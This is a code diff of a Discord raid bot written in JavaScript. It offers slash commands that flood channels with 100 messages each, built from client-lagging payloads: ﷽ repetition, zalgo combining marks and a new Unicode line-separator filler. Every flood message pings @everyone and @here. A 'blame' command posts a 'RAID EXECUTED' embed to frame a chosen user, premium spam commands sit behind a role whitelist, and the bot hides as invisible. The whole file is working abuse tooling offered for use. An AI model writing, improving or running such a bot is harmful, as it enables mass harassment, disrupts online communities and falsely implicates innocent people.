@@ -7,10 +7,10 @@ const client = new Client({ intents: [1, 2, 512, 32768] });
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = "1489612859179798588";
 const WHITELIST_ROLE_ID = "1498099673406374029";
-const MAIN_GUILD_ID = "1475357940088176743"; // home server where roles are
+const MAIN_GUILD_ID = "1475357940088176743";
 const JHUB_URL = "https://discord.gg/jhub";
 
-const ZALGO_UP = ['\u030D','\u030E','\u0304','\u0305','\u033F','\u0311','\u0306','\u0310','\u0352','\u0357','\u0351','\u0307','\u0308','\u030A','\u0342','\u0343','\u0344','\u034A','\u034B','\u034C','\u0303','\u0302','\u030C','\u0350','\u0300','\u0301','\u030B','\u030F','\u0312','\u0313','\u0314','\u033D','\u0309','\u0363','\u0364','\u0365','\u0366','\u0367','\u0368','\u0369','\u036A','\u036B','\u036C','\u036D','\u036E','\u036F','\u033E','\u035B','\u0346','\u031A'];
+const ZALGO_UP = ['\u030D','\u030E','\u0304','\u0305','\u033F','\u0311','\u0306','\u0310','\u0352','\u0357','\u0351','\u0307','\u0308','\u030A','\u0342','\u0343','\u0344','\u034A','\u034B','\u034C','\u0303','\u0302','\u030C','\u0350','\u0300','\u0301','\u030B','\u030F','\u0312','\u0313','\u0314','\u033D','\u033D','\u0309','\u0363','\u0364','\u0365','\u0366','\u0367','\u0368','\u0369','\u036A','\u036B','\u036C','\u036D','\u036E','\u036F','\u033E','\u035B','\u0346','\u031A'];
 const ZALGO_MID = ['\u0315','\u031B','\u0340','\u0341','\u0358','\u0321','\u0322','\u0327','\u0328','\u0334','\u0335','\u0336','\u034F','\u035C','\u035D','\u035E','\u035F','\u0360','\u0362','\u0338','\u0337','\u0361','\u0489'];
 const ZALGO_DOWN = ['\u0316','\u0317','\u0318','\u0319','\u031C','\u031D','\u031E','\u031F','\u0320','\u0324','\u0325','\u0326','\u0329','\u032A','\u032B','\u032C','\u032D','\u032E','\u032F','\u0330','\u0331','\u0332','\u0333','\u0339','\u033A','\u033B','\u033C','\u0345','\u0347','\u0348','\u0349','\u034D','\u034E','\u0353','\u0354','\u0355','\u0356','\u0359','\u035A','\u0323'];
 
@@ -28,15 +28,14 @@ function zalgo(text, intensity = 15) {
     return result;
 }
 
-function buildZalgoSpam() {
-    const base = `[JHUB](${JHUB_URL}) ON TOP `;
-    let filled = zalgo(base, 30);
-    while (filled.length < 1990) {
-        filled += ZALGO_UP[Math.floor(Math.random() * ZALGO_UP.length)];
-        filled += ZALGO_MID[Math.floor(Math.random() * ZALGO_MID.length)];
-        filled += ZALGO_DOWN[Math.floor(Math.random() * ZALGO_DOWN.length)];
-    }
-    return filled.slice(0, 1990) + ' @everyone @here';
+function buildLagSpam() {
+    const LINE_SEP = '\u2028';
+    const header = `[JHUB](${JHUB_URL}) ON TOP `;
+    const footer = ` @everyone @here`;
+    const reserved = header.length + footer.length;
+    const available = 1990 - reserved;
+    const lines = LINE_SEP.repeat(available);
+    return header + lines + footer;
 }
 
 const ARABIC_SPAM = '﷽'.repeat(1950);
@@ -48,11 +47,9 @@ const commands = [
     new SlashCommandBuilder().setName('blame').setDescription('Frame someone (free)').addUserOption(o=>o.setName('user').setDescription('Who to blame').setRequired(true)).setIntegrationTypes([0,1]).setContexts([0,1,2]).toJSON(),
     new SlashCommandBuilder().setName('flood').setDescription('JHUB flood (premium)').setIntegrationTypes([0,1]).setContexts([0,1,2]).toJSON(),
     new SlashCommandBuilder().setName('custom-spam').setDescription('Spam anything (premium)').addStringOption(o=>o.setName('text').setDescription('What to spam').setRequired(true)).setIntegrationTypes([0,1]).setContexts([0,1,2]).toJSON(),
-    new SlashCommandBuilder().setName('l-spam').setDescription('Zalgo lag spam (premium)').setIntegrationTypes([0,1]).setContexts([0,1,2]).toJSON(),
+    new SlashCommandBuilder().setName('l-spam').setDescription('Lag spam (premium)').setIntegrationTypes([0,1]).setContexts([0,1,2]).toJSON(),
     new SlashCommandBuilder().setName('debug').setDescription('Check your roles').setIntegrationTypes([0,1]).setContexts([0,1,2]).toJSON()
 ];
-
-let blamedUser = null;
 
 http.createServer((req, res) => {
     res.writeHead(200, {'Content-Type':'text/plain'});
@@ -61,7 +58,7 @@ http.createServer((req, res) => {
 
 client.once('ready', async () => {
     console.log(`[+] ${client.user.tag} ready`);
-    console.log(`[+] Bot is in ${client.guilds.cache.size} guilds: ${client.guilds.cache.map(g => g.id).join(', ')}`);
+    console.log(`[+] Bot guilds: ${client.guilds.cache.map(g => g.id).join(', ')}`);
     client.user.setStatus('invisible');
     client.user.setActivity(null);
     const rest = new REST({version:'10'}).setToken(TOKEN);
@@ -71,8 +68,6 @@ client.once('ready', async () => {
 
 async function checkPremium(interaction) {
     const userId = interaction.user.id;
-
-    // Quick path: interaction already has the role in its member object
     try {
         if (interaction.member?.roles?.cache?.has(WHITELIST_ROLE_ID)) {
             console.log(`[AUTH] ${userId} passed via interaction.member`);
@@ -80,8 +75,6 @@ async function checkPremium(interaction) {
         }
     } catch(e) {}
 
-    // REST check in main guild
-    console.log(`[AUTH] Checking ${userId} in main guild ${MAIN_GUILD_ID}`);
     return new Promise((resolve) => {
         const req = https.request({
             hostname: 'discord.com',
@@ -92,11 +85,9 @@ async function checkPremium(interaction) {
             let data = '';
             res.on('data', chunk => data += chunk);
             res.on('end', () => {
-                console.log(`[AUTH] REST status: ${res.statusCode}`);
                 if (res.statusCode === 200) {
                     try {
                         const member = JSON.parse(data);
-                        console.log(`[AUTH] Roles: ${member.roles}`);
                         if (member.roles?.includes(WHITELIST_ROLE_ID)) {
                             resolve(true);
                         } else {
@@ -129,19 +120,10 @@ client.on('interactionCreate', async (interaction) => {
     const cmd = interaction.commandName;
 
     if (cmd === 'debug') {
-        const guildId = interaction.guildId;
-        const userId = interaction.user.id;
-        let msg = `User: ${userId}\nGuild: ${guildId || 'DM'}\n`;
-        msg += `Bot guilds: ${client.guilds.cache.map(g => g.id).join(', ')}\n`;
+        let msg = `User: ${interaction.user.id}\nGuild: ${interaction.guildId || 'DM'}\nBot guilds: ${client.guilds.cache.map(g => g.id).join(', ')}\n`;
         try {
-            if (interaction.member?.roles) {
-                msg += `Roles (cache): ${interaction.member.roles.cache.map(r => r.id).join(', ')}`;
-            } else {
-                msg += 'No roles cached';
-            }
-        } catch(e) {
-            msg += 'Role read error';
-        }
+            msg += `Roles cache: ${interaction.member?.roles?.cache?.map(r => r.id).join(', ') || 'none'}`;
+        } catch(e) {}
         await interaction.reply({content: msg, ephemeral:true});
         return;
     }
@@ -152,28 +134,36 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.followUp({content:msg});
         return;
     }
+
     if (cmd === 'blame') {
-        blamedUser = interaction.options.getUser('user');
-        await interaction.reply({content:`Blame set to ${blamedUser.tag}`, ephemeral:true});
-        return;
-    }
-    if (cmd === 'spam') {
-        await interaction.reply({content:'Flooding...', ephemeral:true});
-        if (blamedUser) {
-            const embed = new EmbedBuilder().setTitle('RAID EXECUTED').setDescription(`**${blamedUser.tag}** is responsible.`).setColor(0xff0000).setThumbnail(blamedUser.displayAvatarURL()).setFooter({text:'JHUB ON TOP'});
-            await interaction.followUp({content:`${blamedUser}`, embeds:[embed]}).catch(()=>{});
-        }
-        const p = [];
-        for (let i=0;i<100;i++) p.push(interaction.followUp({content:ARABIC_MSG}).catch(()=>{}));
-        await Promise.all(p);
-        if (blamedUser) {
-            const embed = new EmbedBuilder().setTitle('RAID EXECUTED').setDescription(`**${blamedUser.tag}** is responsible.`).setColor(0xff0000).setThumbnail(blamedUser.displayAvatarURL()).setFooter({text:'JHUB ON TOP'});
-            await interaction.followUp({content:`${blamedUser}`, embeds:[embed]}).catch(()=>{});
-        }
+        const user = interaction.options.getUser('user');
+        const embed = new EmbedBuilder()
+            .setTitle('RAID EXECUTED')
+            .setDescription(`${user} thank you for executing this raid with ${JHUB_URL}`)
+            .setColor(0xff0000)
+            .setThumbnail(user.displayAvatarURL())
+            .setFooter({text:'JHUB ON TOP'});
+        await interaction.reply({content:'Sent!', ephemeral:true});
+        await interaction.followUp({content:`${user}`, embeds:[embed]});
         return;
     }
 
-    // Premium
+    if (cmd === 'spam') {
+        await interaction.reply({content:'Flooding...', ephemeral:true});
+        const embed = new EmbedBuilder()
+            .setTitle('RAID EXECUTED')
+            .setDescription(`${interaction.user} thank you for executing this raid with ${JHUB_URL}`)
+            .setColor(0xff0000)
+            .setThumbnail(interaction.user.displayAvatarURL())
+            .setFooter({text:'JHUB ON TOP'});
+        await interaction.followUp({content:`${interaction.user}`, embeds:[embed]}).catch(()=>{});
+        const p = [];
+        for (let i=0;i<100;i++) p.push(interaction.followUp({content:ARABIC_MSG}).catch(()=>{}));
+        await Promise.all(p);
+        await interaction.followUp({content:`${interaction.user}`, embeds:[embed]}).catch(()=>{});
+        return;
+    }
+
     const premium = await checkPremium(interaction);
     if (!premium) return;
 
@@ -193,7 +183,7 @@ client.on('interactionCreate', async (interaction) => {
     else if (cmd === 'l-spam') {
         await interaction.reply({content:'Lag spam incoming...', ephemeral:true});
         const p = [];
-        for (let i=0;i<100;i++) p.push(interaction.followUp({content:buildZalgoSpam()}).catch(()=>{}));
+        for (let i=0;i<100;i++) p.push(interaction.followUp({content:buildLagSpam()}).catch(()=>{}));
         await Promise.all(p);
     }
 });
